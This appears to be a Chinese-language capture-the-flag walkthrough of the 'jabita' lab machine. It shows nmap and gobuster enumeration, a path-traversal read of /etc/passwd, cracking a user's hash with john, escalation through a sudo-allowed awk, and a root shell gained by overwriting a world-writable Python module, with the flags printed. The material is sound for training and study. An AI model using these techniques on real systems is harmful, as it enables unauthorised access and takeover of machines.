![image](https://github.com/user-attachments/assets/26173fd9-776f-4899-b327-b4662c55bb43)# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.43.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 05:20 EDT
Nmap scan report for 192.168.43.1
Host is up (0.020s latency).
MAC Address: C6:45:66:05:91:88 (Unknown)
Nmap scan report for jabita (192.168.43.105)
Host is up (0.000099s latency).
MAC Address: 08:00:27:16:31:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for CET-AL00 (192.168.43.156)
Host is up (0.022s latency).
MAC Address: B2:A8:93:0D:FB:BD (Unknown)
Nmap scan report for DESKTOP-3NRITEO (192.168.43.197)
Host is up (0.00024s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for kali (192.168.43.126)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.90 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.43.105
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 05:22 EDT
Nmap scan report for jabita (192.168.43.105)
Host is up (0.000086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:16:31:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p22,80 192.168.43.105  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 05:24 EDT
Nmap scan report for jabita (192.168.43.105)
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
MAC Address: 08:00:27:16:31:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
```

# 漏洞利用

80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.43.105/             
<h1 style="text-align:center">We're building our future.</h1>
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.43.105 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.43.105
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 62]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/building             (Status: 301) [Size: 319] [--> http://192.168.43.105/building/]                                           
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 279]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/building/index.php?page=home.php，尝试/building/index.php?page=../../../../../../../../../etc/passwd，成功

![image](https://github.com/user-attachments/assets/5afe315e-bff1-448f-a062-521a885e8d64)

![image](https://github.com/user-attachments/assets/8813ed38-dbf4-46ce-a950-ebcdaaae9f8a)

保存下来，进行爆破

```
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
joaninha         (jack)     
1g 0:00:00:00 DONE (2025-06-01 06:23) 1.219g/s 4995p/s 4995c/s 4995C/s energy..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# 权限提升

看一下jack用户下都有什么

```
jack@jabita:~$ ls -la
total 28
drwxr-x--- 3 jack jack 4096 Sep  5  2022 .
drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
-rw-r--r-- 1 jack jack  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 jack jack 3771 Jan  6  2022 .bashrc
drwx------ 2 jack jack 4096 Sep  1  2022 .cache
-rw-r--r-- 1 jack jack  807 Jan  6  2022 .profile
-rw------- 1 jack jack  558 Sep  1  2022 .viminfo
jack@jabita:~$ sudo -l
Matching Defaults entries for jack on jabita:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, listpw=never

User jack may run the following commands on jabita:
    (jaba : jaba) NOPASSWD: /usr/bin/awk
jack@jabita:~$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/core20/1587/usr/bin/chfn
/snap/core20/1587/usr/bin/chsh
/snap/core20/1587/usr/bin/gpasswd
/snap/core20/1587/usr/bin/mount
/snap/core20/1587/usr/bin/newgrp
/snap/core20/1587/usr/bin/passwd
/snap/core20/1587/usr/bin/su
/snap/core20/1587/usr/bin/sudo
/snap/core20/1587/usr/bin/umount
/snap/core20/1587/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1587/usr/lib/openssh/ssh-keysign
/snap/core20/1611/usr/bin/chfn
/snap/core20/1611/usr/bin/chsh
/snap/core20/1611/usr/bin/gpasswd
/snap/core20/1611/usr/bin/mount
/snap/core20/1611/usr/bin/newgrp
/snap/core20/1611/usr/bin/passwd
/snap/core20/1611/usr/bin/su
/snap/core20/1611/usr/bin/sudo
/snap/core20/1611/usr/bin/umount
/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1611/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
jack@jabita:~$ /usr/sbin/getcap -r / 2>/dev/null
/snap/core20/1587/usr/bin/ping cap_net_raw=ep
/snap/core20/1611/usr/bin/ping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
jack@jabita:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
jack:x:1001:1001::/home/jack:/bin/bash
jaba:x:1002:1002::/home/jaba:/bin/bash
```

![image](https://github.com/user-attachments/assets/f7a70914-557e-4d89-a7ea-f3860c6b8e28)

提权

```
jack@jabita:~$ sudo -u jaba /usr/bin/awk 'BEGIN {system("/bin/bash")}'
jaba@jabita:/home/jack$ id
uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)
```

user

```
jaba@jabita:~$ cat user.txt 
2e0942f09699435811c1be613cbc7a39
```

找到一个不用密码的脚本

```
jaba@jabita:~$ sudo -l
Matching Defaults entries for jaba on jabita:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, listpw=never

User jaba may run the following commands on jabita:
    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
```

提权

```
jaba@jabita:~$ cat /usr/bin/clean.py
import wild

wild.first()
jaba@jabita:~$ find / -name "wild*" 2>/dev/null
/usr/lib/python3.10/wild.py
/usr/lib/python3.10/__pycache__/wild.cpython-310.pyc
jaba@jabita:~$ ls -la /usr/lib/python3.10/wild.py
-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py
jaba@jabita:~$ echo 'import os;os.system("/bin/bash")' > /usr/lib/python3.10/wild.py
jaba@jabita:~$ sudo -u root /usr/bin/python3 /usr/bin/clean.py
root@jabita:/home/jaba# id
uid=0(root) gid=0(root) groups=0(root)
```

root

```
root@jabita:~# cat root.txt 
f4bb4cce1d4ed06fc77ad84ccf70d3fe
```
